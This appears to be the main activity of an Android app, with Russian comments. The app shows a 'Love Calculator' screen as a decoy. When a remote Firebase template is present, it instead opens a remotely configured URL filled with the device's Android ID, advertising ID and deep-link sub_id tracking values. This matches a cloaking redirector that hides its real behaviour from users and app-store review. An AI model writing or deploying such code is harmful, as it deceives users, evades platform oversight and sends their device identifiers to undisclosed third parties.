package com.example.testdeeplink;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.browser.customtabs.CustomTabsIntent;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;

public class MainActivity extends AppCompatActivity
{
    public static final String DEEPLINK  = "deeplink";
    public static final String FINALLINK = "link";
    public static final String SETTINGS  = "settings";
    public static final String LOGTAG    = "-------------------";

    public static String appId = "";
    public static String deviceId = "";
    public static String advertId = "";
    public static String dl = "";
    public static String sub_id_1 = "";
    public static String sub_id_2 = "";
    public static String sub_id_3 = "";
    public static String sub_id_4 = "";
    public static String sub_id_5 = "";

    public static Boolean isFirebaseIsReady = false;

    public static final short TRIES_TIME = 1000; // Время на попытку
    public static final short TRIES_LIMIT = 5; // кол-во попыток
    public static short tries_counter = 0;

    public static String link;
    public static SharedPreferences shared_prefs;

    protected boolean isOnline()
    {
        boolean haveConnectedWifi = false;
        boolean haveConnectedMobile = false;

        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo[] netInfo = cm.getAllNetworkInfo();
        for (NetworkInfo ni : netInfo) {
            if (ni.getTypeName().equalsIgnoreCase("WIFI"))
                if (ni.isConnected())
                    haveConnectedWifi = true;
            if (ni.getTypeName().equalsIgnoreCase("MOBILE"))
                if (ni.isConnected())
                    haveConnectedMobile = true;
        }
        return haveConnectedWifi || haveConnectedMobile;


    }

    class myAsyncTask extends AsyncTask<Void, Void, Void>
    {
        @Override
        protected Void doInBackground(Void... voids)
        {
            try {
                AdvertisingIdClient.Info idInfo = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext());
                advertId = idInfo.getId();
                Log.i(LOGTAG, "advert_ID " + advertId);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        appId = BuildConfig.APPLICATION_ID;
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        // инициализируем шаредсеттингс
        shared_prefs = getSharedPreferences(SETTINGS, Context.MODE_PRIVATE);

        // находим и парсим диплинк если есть
        this.findDeeplink();

        if (isOnline())
        {
            Log.i(LOGTAG, "Internet is present");
            // ищем advertId
            new myAsyncTask().execute();

            final FirebaseRemoteConfigClass firebaseRemoteConfigClass = new FirebaseRemoteConfigClass();
            firebaseRemoteConfigClass.getTemplate();

            new Handler().postDelayed(new Runnable()
            {
                @Override
                public void run()
                {
                    if (isFirebaseIsReady)
                    {
                        Log.i(LOGTAG, "delivered template: " + (firebaseRemoteConfigClass.template != null ? firebaseRemoteConfigClass.template : "null"));
                        if (firebaseRemoteConfigClass.template != null) {
                            link = P4.fillTemplate(firebaseRemoteConfigClass.template);
                            shared_prefs.edit().putString(FINALLINK, link).apply();
                            Log.i(MainActivity.LOGTAG, "outputlink from remoteconfig: " + link);
                        } else {
                            String link_from_store = shared_prefs.getString(FINALLINK, "");
                            if (link_from_store != null && !link_from_store.isEmpty()) {
                                link = link_from_store;
                                Log.i(MainActivity.LOGTAG, "outputlink from store: " + link);

                            }
                        }

                        if (link != null) {
                            toWeb();
                        } else {
                            toLoveCalculator();
                        }
                    }
                    else
                    {
                        tries_counter ++;
                        if (tries_counter >= TRIES_LIMIT)
                        {
                            Log.i(MainActivity.LOGTAG, "Tries was limited");

                            String link_from_store = shared_prefs.getString(FINALLINK, "");
                            if (link_from_store != null && !link_from_store.isEmpty()) {
                                link = P4.fillTemplate(link_from_store);
                                toWeb();
                                Log.i(MainActivity.LOGTAG, "outputlink from store: " + link);
                            } else {
                                toLoveCalculator();
                            }
                        } else {
                            new Handler().postDelayed(this, TRIES_TIME);
                        }

                    }
                }

            }, TRIES_TIME);
        }
        else
        {
            Log.i(LOGTAG, "No internet");
            toLoveCalculator();
        }
    }

    private void findDeeplink()
    {
        String final_deeplink = null;
        Uri uri = getIntent().getData();
        String result = null;
        if (uri != null)
        {
            String deeplink_from_intent = uri.toString();
            shared_prefs.edit().putString(DEEPLINK, deeplink_from_intent).apply();
            final_deeplink = deeplink_from_intent;
            Log.i(LOGTAG, "deeplink from intent: " + deeplink_from_intent.toString());
        }
        else
        {
            String deeplink_from_store = shared_prefs.getString(DEEPLINK, "");
            if (!deeplink_from_store.isEmpty())
            {
                final_deeplink = deeplink_from_store;
                Log.i(LOGTAG, "deep link from storage: " + shared_prefs.getString(DEEPLINK, ""));
            }
        }

        if (final_deeplink != null)
        {
            P6.parseDeeplinkSting(final_deeplink);
            Log.i(LOGTAG, "dl: "       + MainActivity.dl);
            Log.i(LOGTAG, "sub_id_1: " + MainActivity.sub_id_1);
            Log.i(LOGTAG, "sub_id_2: " + MainActivity.sub_id_2);
            Log.i(LOGTAG, "sub_id_3: " + MainActivity.sub_id_3);
            Log.i(LOGTAG, "sub_id_4: " + MainActivity.sub_id_4);
            Log.i(LOGTAG, "sub_id_5: " + MainActivity.sub_id_5);
        }

        Log.i(LOGTAG, "final deeplink: " + final_deeplink);
    }

    public void toWeb()
    {
        CustomTabsIntent customTabsIntent = new CustomTabsIntent.Builder().build();
        customTabsIntent.launchUrl(this, Uri.parse(link));
    }

    public void toLoveCalculator()
    {
        Intent intent = new Intent(MainActivity.this, ItemListActivity.class);
        startActivity(intent);
        finish();
    }

}
